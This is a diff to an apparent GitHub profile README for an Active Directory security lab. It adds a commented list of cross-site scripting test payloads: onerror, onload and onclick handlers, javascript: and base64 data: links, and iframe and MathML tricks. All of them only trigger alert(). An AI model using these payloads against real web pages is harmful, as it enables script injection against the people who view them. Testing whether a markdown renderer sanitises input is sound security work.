@@ -81,3 +81,34 @@ A practical lab for AD security testing and defense demonstrations.
     <img src="https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white" />
   </a>
 </p>
+
+<!-- XSS Test Payloads for GitHub Profile -->
+<!-- Image with onerror -->
+<img src="x" onerror="alert('XSS')">
+
+<!-- SVG with onload -->
+<svg onload="alert(1)"></svg>
+
+<!-- Link with javascript: -->
+[click](javascript:alert(1))
+
+<!-- Data URI link -->
+[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
+
+<!-- Iframe -->
+<iframe src="javascript:alert(1)"></iframe>
+
+<!-- Body onload -->
+<body onload="alert(1)">
+
+<!-- MathML -->
+<math><mi onclick="alert(1)">X</mi></math>
+
+<!-- Image with onerror (markdown style) -->
+![alt](x "onerror=alert(1)")
+
+<!-- Link with onmouseover via title -->
+[hover](https://example.com "onmouseover=alert(1)")
+
+<!-- Using href with javascript -->
+[test](javascript:alert('XSS'))
